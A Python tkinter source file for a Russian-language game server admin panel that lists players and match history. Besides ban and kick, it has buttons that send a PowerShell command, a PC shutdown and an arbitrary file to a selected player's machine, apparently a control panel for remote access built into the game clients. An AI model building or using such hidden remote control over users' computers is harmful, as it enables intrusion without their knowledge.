import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import base64
from PIL import Image, ImageTk
import io
import os

class ProfessionalAdminPanel:
    def __init__(self, sock):
        self.sock = sock
        self.root = tk.Toplevel()
        self.root.title("ПАНЕЛЬ УПРАВЛЕНИЯ - АДМИНИСТРАТОР")
        self.root.geometry("1000x850")
        self.root.configure(bg="#0f0f0f")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#1a1a1a", foreground="white", fieldbackground="#1a1a1a", rowheight=25, borderwidth=0)
        style.configure("Treeview.Heading", background="#333", foreground="white")

        btn_frame = tk.Frame(self.root, bg="#0f0f0f")
        btn_frame.pack(fill="x", pady=10, padx=10)
        
        self.add_btn(btn_frame, "ОБНОВИТЬ", "#444", self.refresh)
        self.add_btn(btn_frame, "АВАТАР", "#2e8b57", self.view_avatar)
        self.add_btn(btn_frame, "БАН", "#b22222", lambda: self.action("BAN"))
        self.add_btn(btn_frame, "КИКНУТЬ", "#ff8c00", lambda: self.action("KICK"))
        self.add_btn(btn_frame, "POWERSHELL", "#0078d7", lambda: self.action("POWERSHELL"))
        self.add_btn(btn_frame, "ВЫКЛЮЧИТЬ ПК", "#333", lambda: self.action("SHUTDOWN"))
        self.add_btn(btn_frame, "ОТПРАВИТЬ ФАЙЛ", "#4b0082", self.send_file_dialog)

        tk.Label(self.root, text="ПОЛЬЗОВАТЕЛИ", fg="cyan", bg="#0f0f0f", font=("Arial", 10, "bold")).pack(anchor="w", padx=10)
        self.tree = ttk.Treeview(self.root, columns=("Login", "Status"), show="headings", height=8)
        self.tree.heading("Login", text="ЛОГИН")
        self.tree.heading("Status", text="СТАТУС")
        self.tree.pack(fill="x", padx=10, pady=5)
        
        tk.Label(self.root, text="ИСТОРИЯ МАТЧЕЙ", fg="yellow", bg="#0f0f0f", font=("Arial", 10, "bold")).pack(anchor="w", padx=10, pady=(10, 0))
        self.history_tree = ttk.Treeview(self.root, columns=("Winner", "Loser", "Result", "Time"), show="headings", height=15)
        self.history_tree.heading("Winner", text="ПОБЕДИТЕЛЬ")
        self.history_tree.heading("Loser", text="ПРОИГРАВШИЙ")
        self.history_tree.heading("Result", text="ИТОГ")
        self.history_tree.heading("Time", text="ВРЕМЯ")
        self.history_tree.pack(fill="both", expand=True, padx=10, pady=5)

        self.users_images = {}
        self.refresh()

    def add_btn(self, master, text, color, cmd):
        tk.Button(master, text=text, bg=color, fg="white", relief="flat", font=("Arial", 8, "bold"), 
                  command=cmd, padx=10, pady=5).pack(side="left", padx=2)

    def refresh(self):
        try:
            self.sock.send("GET_USERS".encode())
            raw_data = self.sock.recv(1024 * 1000).decode('utf-8', errors='ignore')
            if "DATA_UPDATE" in raw_data:
                parts = raw_data.split("DATA_UPDATE|")[1].split("#")
                user_data = parts[0].strip().split("|")
                history_data = parts[1].strip().split("|") if len(parts) > 1 else []

                self.tree.delete(*self.tree.get_children())
                for u in user_data:
                    p = u.split(",")
                    if len(p) >= 3:
                        login, status, img_b64 = p[0], p[1], p[2]
                        st_text = "АКТИВЕН" if status == "1" else "ЗАБАНЕН"
                        self.tree.insert("", "end", values=(login, st_text))
                        self.users_images[login] = img_b64

                self.history_tree.delete(*self.history_tree.get_children())
                for h in history_data:
                    p = h.split(",")
                    if len(p) == 4:
                        res = "НИЧЬЯ" if p[2] == "1" else "ПОБЕДА"
                        self.history_tree.insert("", "end", values=(p[0], p[1], res, p[3]))
        except: pass

    def view_avatar(self):
        sel = self.tree.selection()
        if not sel: return
        target = self.tree.item(sel[0])['values'][0]
        img_b64 = self.users_images.get(target)
        if img_b64 and img_b64 != "None":
            top = tk.Toplevel(); top.title(target)
            img = Image.open(io.BytesIO(base64.b64decode(img_b64))).resize((250, 250))
            self.tmp_img = ImageTk.PhotoImage(img)
            tk.Label(top, image=self.tmp_img).pack()

    def send_file_dialog(self):
        sel = self.tree.selection()
        if not sel: return
        path = filedialog.askopenfilename()
        if path:
            target = self.tree.item(sel[0])['values'][0]
            with open(path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode()
            self.sock.send(f"ADMIN_ACTION|SEND_FILE|{target}|{os.path.basename(path)}|{file_data}".encode())

    def action(self, cmd):
        sel = self.tree.selection()
        if not sel: return
        target = self.tree.item(sel[0])['values'][0]
        self.sock.send(f"ADMIN_ACTION|{cmd}|{target}".encode())
        self.sock.recv(1024)
        self.refresh()